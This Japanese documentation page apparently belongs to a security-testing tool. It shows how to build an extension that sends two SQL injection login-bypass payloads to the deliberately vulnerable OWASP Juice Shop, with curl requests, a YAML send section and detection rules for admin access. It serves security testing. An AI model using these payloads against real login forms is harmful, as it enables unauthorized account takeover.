```markdown
[link-meta-info]:           ../create-extension.md#structure-of-the-meta-info-section
[link-send-headers]:        ../phase-send.md
[link-using-extension]:     ../using-extension.md
[link-app-examination]:     app-examination.md

[doc-send-phase]:           ../phase-send.md
[doc-detect-phase]:         ../detect/phase-detect.md

[link-juice-shop]:          https://www.owasp.org/index.php/OWASP_Juice_Shop_Project

#  変更を加えない拡張機能の作成

本書で説明する拡張機能は、ペイロードを注入するために入力された基線リクエストを変更しません。代わりに、基線リクエストで指定されたホストに対して、あらかじめ定義された2つのテストリクエストが送信されます。これらのテストリクエストは、[“OWASP Juice Shop”][link-juice-shop]ターゲットアプリケーションのログインフォームに存在するSQLi脆弱性の悪用につながる可能性のあるペイロードを含みます。

##  準備

FAST拡張機能の作成前に、ターゲットアプリケーションの動作を[検証する][link-app-examination]ことを強く推奨します。

##  拡張機能の構築

拡張機能の説明を行うファイル（例：`non-mod-extension.yaml`）を作成し、必要なセクションで内容を埋めてください：

1.  [**`meta-info`セクション**][link-meta-info]

    拡張機能が検出を試みる脆弱性の説明を用意してください。
    
    * 脆弱性ヘッダー: `OWASP Juice Shop SQLi (non-mod extension)`
    * 脆弱性の説明: `Demo of SQLi in OWASP Juice Shop (Admin Login)`
    * 脆弱性タイプ: SQL injection
    * 脆弱性の脅威レベル: high
    
    対応する`meta-info`セクションは以下のようになります：
    
    ```
    meta-info:
      - type: sqli
      - threat: 80
      - title: 'OWASP Juice Shop SQLi (non-mod extension)'
      - description: 'Demo of SQLi in OWASP Juice Shop (Admin Login)'
    ```
    
2.  **`send`セクション，[Send phase][doc-send-phase]**

    ターゲットアプリケーションのSQLi脆弱性を悪用するため、任意の`password`値とともに、`email`パラメータ値として送信されるべき2つのペイロードがあります：
    
    * `'or 1=1 --`
    * `admin@juice-sh.op'--`
    
    各テストリクエストは、以下を含むように作成できます：
    
    * 上記のいずれかの値を持つ`email`パラメータ
    * 任意の値を持つ`password`パラメータ

    これらのリクエストのうちの1つだけを使用して、例として挙げたターゲットアプリケーション（OWASP Juice Shop）をテストするだけで十分です。
    
    ただし、実際のアプリケーションのセキュリティテストを実施する際には、いくつかの事前に作成されたテストリクエストのセットが有用です。なぜなら、アプリケーションのアップデートや改善により、あるリクエストが脆弱性を悪用できなくなった場合でも、他のペイロードを使用したリクエストが脆弱性を悪用できる可能性があるためです。

    上記リストの最初のペイロードを使用したリクエストは、以下のようになります：
    
    ```
    curl --request POST --url http://ojs.example.local/rest/user/login \
         --header 'content-type: application/json' \
         --header 'host: ojs.example.local' \
         --data '{"email":"'\''or 1=1 --", "password":"12345"}'
    ```

    2番目のリクエストも同様の形式です：
    
    ```
    curl --request POST --url http://ojs.example.local/rest/user/login \
         --header 'content-type: application/json' \
         --header 'host: ojs.example.local' \
         --data '{"email":"admin@juice-sh.op'\''--", "password":"12345"}'
    ```

    これら2つのテストリクエストの説明を含む`send`セクションを追加してください：
    
    ```
    send:
      - method: 'POST'
        url: '/rest/user/login'
        headers:
        - 'Content-Type': 'application/json'
        body: '{"email":"''or 1=1 --","password":"12345"}'
      - method: 'POST'
        url: '/rest/user/login'
        headers:
        - 'Content-Type': 'application/json'
        body: '{"email":"admin@juice-sh.op''--","password":"12345"}'
    ``` 
    
    !!! info "Hostヘッダーに関する注意"
        これらのリクエストでは、特定のSQLi脆弱性の悪用に影響を与えないため、`Host`ヘッダーは省略可能です。FASTノードは、入力された基線リクエストから抽出された`Host`ヘッダーを自動的に付加します。
        
        [こちら][link-send-headers]を参照し、Send phaseがリクエストヘッダーをどのように処理するかを確認してください。

3.  **`detect`セクション，[Detect phase][doc-detect-phase]**
    
    以下の条件は、管理者権限のユーザー認証が成功したことを示します：
    
    * レスポンスボディ内に、`1`の値を持つショッピングカート識別子パラメータが存在すること。パラメータはJSON形式で、以下のようになります：
    
        ```
        "bid":1
        ```
    
    * レスポンスボディ内に、`admin@juice-sh.op`の値を持つユーザーのメールアドレスパラメータが存在すること。パラメータはJSON形式で、以下のようになります：
    
        ```
         "umail":"admin@juice-sh.op"
        ```
    
    上記条件に基づいて攻撃が成功したかどうかを確認する`detect`セクションを追加してください。
    
    ```
    detect:
      - response:
        - body: "\"umail\":\"admin@juice-sh.op\""
        - body: "\"bid\":1"
    ```
    
!!! info "特殊記号のエスケープ"
    文字列内の特殊記号をエスケープすることを忘れないでください。

##  拡張機能のファイル

これで`non-mod-extension.yaml`ファイルには、拡張機能の動作に必要な全セクションが揃っています。ファイルの内容は以下の通りです：

??? info "non-mod-extension.yaml"
    ```
    meta-info:
      - type: sqli
      - threat: 80
      - title: 'OWASP Juice Shop SQLi (non-mod extension)'
      - description: 'Demo of SQLi in OWASP Juice Shop (Admin Login)'

    send:
      - method: 'POST'
        url: '/rest/user/login'
        headers:
        - 'Content-Type': 'application/json'
        body: '{"email":"''or 1=1 --","password":"12345"}'
      - method: 'POST'
        url: '/rest/user/login'
        headers:
        - 'Content-Type': 'application/json'
        body: '{"email":"admin@juice-sh.op''--","password":"12345"}'

    detect:
      - response:
        - body: "\"umail\":\"admin@juice-sh.op\""
        - body: "\"bid\":1"
    ```

##  拡張機能の使用

作成した拡張機能の使用方法についての詳細は、[こちらのドキュメント][link-using-extension]を参照してください。
```